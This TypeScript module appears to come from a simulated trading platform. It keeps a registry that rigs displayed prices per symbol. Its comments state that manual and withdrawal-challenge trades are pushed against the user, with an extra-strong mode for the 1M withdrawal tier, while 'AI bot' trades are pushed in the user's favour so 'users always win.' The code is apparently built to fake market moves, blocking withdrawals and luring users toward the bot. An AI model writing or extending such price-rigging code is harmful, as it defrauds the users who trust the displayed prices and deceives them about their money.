// Per-symbol active-trade bias registry. Trading.tsx writes when a position is
// opened; usePriceSimulation reads it to nudge the price.
//   - mode "against": push price AGAINST the user (manual / withdrawal challenge)
//   - mode "favor":   push price WITH the user (AI bot — users always win)
// "force" makes the against-bias extra strong (used for the 1M withdrawal tier).

export type BiasMode = "against" | "favor";

export interface ActiveBias {
  symbol: string;
  direction: "buy" | "sell"; // user's chosen direction
  openedAt: number;
  mode: BiasMode;
  force?: boolean;
}

const biases = new Map<string, ActiveBias>();

export const registerBias = (
  symbol: string,
  direction: "buy" | "sell",
  force = false
) => {
  biases.set(symbol, { symbol, direction, openedAt: Date.now(), mode: "against", force });
};

// AI bot trades — bias price WITH the user so the chart shows a winning move.
export const registerFavorBias = (symbol: string, direction: "buy" | "sell") => {
  biases.set(symbol, { symbol, direction, openedAt: Date.now(), mode: "favor" });
};

export const clearBias = (symbol: string) => {
  biases.delete(symbol);
};

export const getBias = (symbol: string): ActiveBias | undefined => biases.get(symbol);

// Returns a price delta to add this tick (0 when no active bias / expired).
export const getBiasNudge = (
  symbol: string,
  currentPrice: number,
  volatility: number,
  lifetimeMs = 60000
): number => {
  const b = biases.get(symbol);
  if (!b) return 0;
  if (Date.now() - b.openedAt > lifetimeMs) {
    biases.delete(symbol);
    return 0;
  }

  let sign: number;
  if (b.mode === "favor") {
    sign = b.direction === "buy" ? 1 : -1; // move with the user
  } else {
    sign = b.direction === "buy" ? -1 : 1; // move against the user
  }

  const magnitude = b.force
    ? 2.5 + Math.random() * 1.5
    : b.mode === "favor"
      ? 1.0 + Math.random() * 0.8
      : 0.6 + Math.random() * 0.5;

  return sign * volatility * currentPrice * magnitude;
};

// Returns +1 to bias price UP, -1 to bias DOWN, 0 if no active bias / expired
export const getBiasDirection = (symbol: string, lifetimeMs = 30000): number => {
  const b = biases.get(symbol);
  if (!b) return 0;
  if (Date.now() - b.openedAt > lifetimeMs) {
    biases.delete(symbol);
    return 0;
  }
  if (b.mode === "favor") return b.direction === "buy" ? 1 : -1;
  return b.direction === "buy" ? -1 : 1;
};

export const isForcedBias = (symbol: string, lifetimeMs = 30000): boolean => {
  const b = biases.get(symbol);
  if (!b) return false;
  if (Date.now() - b.openedAt > lifetimeMs) {
    biases.delete(symbol);
    return false;
  }
  return !!b.force;
};
